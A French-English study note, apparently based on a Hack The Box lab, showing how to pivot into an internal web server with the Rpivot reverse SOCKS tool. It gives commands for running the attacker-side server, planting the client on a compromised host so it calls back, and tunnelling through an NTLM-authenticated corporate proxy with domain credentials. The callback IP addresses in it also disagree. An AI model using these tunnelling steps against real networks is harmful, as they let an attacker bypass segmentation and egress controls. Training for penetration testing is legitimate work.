# Web Server Pivoting with Rpivot

***

{% hint style="warning" %}
Rpivot est un outil Python de proxy SOCKS inversé pour le tunneling SOCKS. Il permet de lier une machine dans un réseau interne à un serveur externe et d’exposer le port local du client côté serveur. Par exemple, si nous avons un serveur web sur notre réseau interne (172.16.5.135), Rpivot permet d’y accéder via ce proxy.
{% endhint %}

![](https://academy.hackthebox.com/storage/modules/158/77.png)

<mark style="color:green;">**Cloning rpivot**</mark>

```shell-session
mrroboteLiot@htb[/htb]$ git clone https://github.com/klsecservices/rpivot.git
```

<mark style="color:green;">**Installing Python2.7**</mark>

```shell-session
mrroboteLiot@htb[/htb]$ sudo apt-get install python2.7
```

<mark style="color:green;">**Alternative Installation of Python2.7**</mark>

{% code fullWidth="true" %}
```shell-session
curl https://pyenv.run | bash
echo 'export PYENV_ROOT="$HOME/.pyenv"' >> ~/.bashrc
echo 'command -v pyenv >/dev/null || export PATH="$PYENV_ROOT/bin:$PATH"' >> ~/.bashrc
echo 'eval "$(pyenv init -)"' >> ~/.bashrc
source ~/.bashrc
pyenv install 2.7
pyenv shell 2.7
```
{% endcode %}

<mark style="color:green;">**Running server.py from the Attack Host**</mark>

{% code fullWidth="true" %}
```shell-session
mrroboteLiot@htb[/htb]$ python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
```
{% endcode %}

<mark style="color:green;">**Transfering rpivot to the Target**</mark>

```shell-session
mrroboteLiot@htb[/htb]$ scp -r rpivot ubuntu@<IpaddressOfTarget>:/home/ubuntu/
```

<mark style="color:green;">**Running client.py from Pivot Target**</mark>

```shell-session
ubuntu@WEB01:~/rpivot$ python2.7 client.py --server-ip 10.10.15.124 --server-port 9999

Backconnecting to server 10.10.14.18 port 9999
```

<mark style="color:green;">**Confirming Connection is Established**</mark>

```shell-session
New connection from host 10.129.202.64, source port 35226
```

<mark style="color:green;">**Browsing to the Target Webserver using Proxychains**</mark>

```shell-session
proxychains firefox-esr 172.16.5.135:80
```

![](https://academy.hackthebox.com/storage/modules/158/rpivot_proxychain.png)

{% hint style="info" %}
(Ton PC) Firefox → ProxyChains → 127.0.0.1:9050\
↓\
(Ton PC) Rpivot server.py (écoute sur 9999)\
↓\
(Tunnel établi par client.py)\
↓\
(Pivot) Rpivot client.py → Forward vers 172.16.5.135:80\
↓\
(Webserver interne) Réponse → Pivot → Rpivot → ProxyChains → Firefox
{% endhint %}

{% hint style="info" %}
Similar to the pivot proxy above, there could be scenarios when we cannot directly pivot to an external server (attack host) on the cloud. Some organizations have [HTTP-proxy with NTLM authentication](https://docs.microsoft.com/en-us/openspecs/office_protocols/ms-grvhenc/b9e676e7-e787-4020-9840-7cfe7c76044a) configured with the Domain Controller. In such cases, we can provide an additional NTLM authentication option to rpivot to authenticate via the NTLM proxy by providing a username and password. In these cases, we could use rpivot's client.py in the following way:
{% endhint %}

<mark style="color:green;">**Connecting to a Web Server using HTTP-Proxy & NTLM Auth**</mark>

{% code overflow="wrap" fullWidth="true" %}
```shell-session
python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>
```
{% endcode %}
